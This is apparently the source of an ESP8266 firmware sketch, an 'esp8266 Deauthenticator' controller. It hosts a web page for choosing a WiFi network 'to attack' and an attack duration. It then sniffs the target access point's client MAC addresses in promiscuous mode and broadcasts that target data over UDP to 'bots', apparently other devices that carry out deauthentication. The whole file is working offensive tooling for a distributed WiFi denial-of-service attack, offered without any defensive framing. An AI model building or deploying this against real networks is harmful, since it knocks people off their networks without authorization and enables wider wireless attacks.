
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <WiFiUdp.h>
#include <Esp.h>

extern "C" {
#include "user_interface.h"
}

#define	SNIFF_TIME	120
#define	MAX_CL		16
#define UDP_PORT	4210
#define DEF_TIME	120

typedef struct
{
	uint8_t		mac[6];
	char		ssid[33];
	uint8_t		channel;
	uint8_t		count_cl;
	uint8_t		client[MAX_CL][6];
	uint8_t		time;
} 				ap;

ap 				access_point;
const char		*ssid = "esp_ap";
const char		*password = "password";
IPAddress		ip;

ESP8266WebServer	server(80);
WiFiClient			client;
WiFiUDP				Udp;

os_timer_t			sniff_timer;
os_timer_t			udp_timer;


//Promiscuous callback structures for storing package data, see Espressif SDK handbook
struct	RxControl {
    signed rssi:8;
    unsigned rate:4;
    unsigned is_group:1;
    unsigned:1;
    unsigned sig_mode:2;
    unsigned legacy_length:12;
    unsigned damatch0:1;
    unsigned damatch1:1;
    unsigned bssidmatch0:1;
    unsigned bssidmatch1:1;
    unsigned MCS:7;
    unsigned CWB:1;
    unsigned HT_length:16;
    unsigned Smoothing:1;
    unsigned Not_Sounding:1;
    unsigned:1;
    unsigned Aggregation:1;
    unsigned STBC:2;
    unsigned FEC_CODING:1;
    unsigned SGI:1;
    unsigned rxend_state:8;
    unsigned ampdu_cnt:8;
    unsigned channel:4;
    unsigned:12;
};
struct	LenSeq {
    uint16_t length;
    uint16_t seq;
    uint8_t  address3[6];
};
struct	sniffer_buf {
    struct RxControl rx_ctrl;
    uint8_t buf[36];
    uint16_t cnt;
    struct LenSeq lenseq[1];
};
struct	sniffer_buf2 {
    struct RxControl rx_ctrl;
    uint8_t buf[112];
    uint16_t cnt;
    uint16_t len;
};

void	promisc_cb(uint8_t *buf, uint16_t len)
{

	uint8_t* buffi;

	if (len == 12)
		return ;
	else if (len == 128)
	{
		struct sniffer_buf2 *sniffer = (struct sniffer_buf2 *)buf;
		buffi = sniffer->buf;
	} 
	else
	{
		struct sniffer_buf *sniffer = (struct sniffer_buf *)buf;
		buffi = sniffer->buf;
	}

	if (memcmp(&buffi[10], &access_point.mac, 6))
		return ;

	//broadcast
	if (buffi[4] == 0xff && buffi[5] == 0xff && buffi[6] == 0xff && \
		buffi[7] == 0xff && buffi[8] == 0xff && buffi[9] == 0xff)
		return ;

	//multicast
	if ((buffi[4] == 0x01 && buffi[5] == 0x00 && buffi[6] == 0x5e) || \
		(buffi[4] == 0x33 && buffi[5] == 0x33))
		return ;

	for (uint8_t i = 0; i < access_point.count_cl; ++i)
	{
		if (!memcmp(&buffi[4], &access_point.client[i][0], 6))
			return ;
	}

	memcpy(access_point.client[access_point.count_cl], &buffi[4] , 6);

	Serial.printf("new client found!(%2d):\t", access_point.count_cl + 1);
	Serial.printf("%02x:%02x:%02x:%02x:%02x:%02x\t\n", MAC2STR(access_point.client[access_point.count_cl]));

	++(access_point.count_cl);

	if (access_point.count_cl == MAX_CL)
		sniff_terminate();

}

void	sniff_terminate(void)
{

	os_timer_disarm(&sniff_timer);
	wifi_promiscuous_enable(0);

	if (access_point.count_cl == MAX_CL)
		Serial.printf("list is full, sniffing has been stopped\n\n");
	else
		Serial.printf("time is over, sniffing has been stopped\n\n");

	WiFi.softAP(ssid, password);
	server.begin();
	Serial.print("http server started\n\n");

	os_timer_disarm(&udp_timer);
	os_timer_setfn(&udp_timer, (os_timer_func_t *)send_info, NULL);
	os_timer_arm(&udp_timer, 15 * 1000, 0);

}

void	send_info(void)
{

	Udp.beginPacket(IPAddress(ip[0], ip[1], ip[2], 255), UDP_PORT);
	Udp.write((char *)&access_point, sizeof(ap));
	Udp.endPacket();
	Serial.print("attack info sent to bots\n\n");

}

void	handleMain(void)
{

	int n;

	WiFi.scanDelete();

	Serial.print("scanning for WiFi networks\n");
	Serial.printf("%d networks found\n\n", n = WiFi.scanNetworks());

	String	content = "";

	content += "<!DOCTYPE html><html style='width: 640px'><head>";
	content += "<title>esp8266 Deauthenticator</title>";
	content += "<meta name=\"viewport\" content=\"width=device-width\">";
	content += "</head><body>";
	content += "<table>";
	content += "<form action='/restart' method='post' name='restartForm'><input type='submit' value='restart esp8266'></form>";
	
	content += "<h2>choose network to attack</h2>";
	content += "<form action='/submit' method='post' id='apForm'>";
	for (uint8_t i = 0; i < n; i++)
		content += "<tr><td><input type='radio' form='apForm' name='ap' value='" + String(i) + "'>" + WiFi.BSSIDstr(i) + "</td>   <td>" + WiFi.SSID(i) + "</td></tr>";

	content += "<tr><td><br></td></tr>";
	content += "<tr><td>duration of attack</td>   <td><input type='number' form='apForm' name='time' value='120' min='60' max='3600' size='4'></td></tr>";
	content += "<tr><td><input type='submit' form='apForm' value='Submit'></td></tr>";
	content += "</form>";

	content += "<tr><td><h2>connected devices:</h2></td><td><h2>" + String(wifi_softap_get_station_num()) + "</h2></td></tr>";
	struct station_info *station_list = wifi_softap_get_station_info();
	while (station_list != NULL) {
		IPAddress clientIP = (&station_list->ip)->addr;
		char station_mac[18] = {0};
		sprintf(station_mac, "%02x:%02x:%02x:%02x:%02x:%02x", MAC2STR(station_list->bssid));
		content += "<tr><td>" + String(clientIP[0]) + "." + String(clientIP[1]) + "." + String(clientIP[2]) + "." + String(clientIP[3]) + "</td><td>" + station_mac  + "</td></tr>";
		station_list = STAILQ_NEXT(station_list, next);
    }

    content += "</table>";
	content += "</body></html>";
	server.send(200, "text/html", content);
}

void	handleSubmit(void)
{

	if (!server.hasArg("ap"))
	{
		Serial.print("form is empty\n\n");
		handleMain();
		return ;
	}

	int n = atoi(server.arg("ap").c_str());

	memset(&access_point, 0, sizeof(ap));
	memcpy(&access_point.ssid, WiFi.SSID(n).c_str(), strlen(WiFi.SSID(n).c_str()));
	memcpy(&access_point.mac, WiFi.BSSID(n), 6);
	access_point.channel = WiFi.channel(n);
	access_point.time = (server.hasArg("time")) ? atoi(server.arg("time").c_str()) : DEF_TIME;

	Serial.print("access point for attack:\n");
	Serial.printf("\tssid:    %s\n", access_point.ssid);
	Serial.printf("\tmac:     %02x:%02x:%02x:%02x:%02x:%02x\n", MAC2STR(access_point.mac));
	Serial.printf("\tchannel: %d\n", access_point.channel);
	Serial.printf("\ttime:    %d\n\n", access_point.time);

	wifi_set_opmode(STATION_MODE);
	wifi_set_channel(access_point.channel);
	wifi_promiscuous_enable(0);
	wifi_set_promiscuous_rx_cb(promisc_cb);

	os_timer_disarm(&sniff_timer);
	os_timer_setfn(&sniff_timer, (os_timer_func_t *)sniff_terminate, NULL);
	os_timer_arm(&sniff_timer, SNIFF_TIME * 1000, 0);

	wifi_promiscuous_enable(1);
	Serial.print("sniffing started\n\n");

}

void	handleRestart(void)
{
	
	Serial.print("rebooting...");
	WiFi.softAPdisconnect(true);
	delay(10000);
	ESP.restart();

}

void	setup()
{

	Serial.begin(115200);

	WiFi.softAP(ssid, password);

	ip = WiFi.softAPIP();

	server.on("/", handleMain);
	server.on("/submit", handleSubmit);
	server.on("/restart", handleRestart);
	server.begin();

	Serial.print("\n\n");
	Serial.printf("SSID:     %s\n", ssid);
	Serial.printf("pass:     %s\n", password);
	Serial.printf("ip:       %s\n", ip.toString().c_str());
	Serial.printf("udp port: %d\n\n", UDP_PORT);

}

void	loop()
{

	server.handleClient();

}
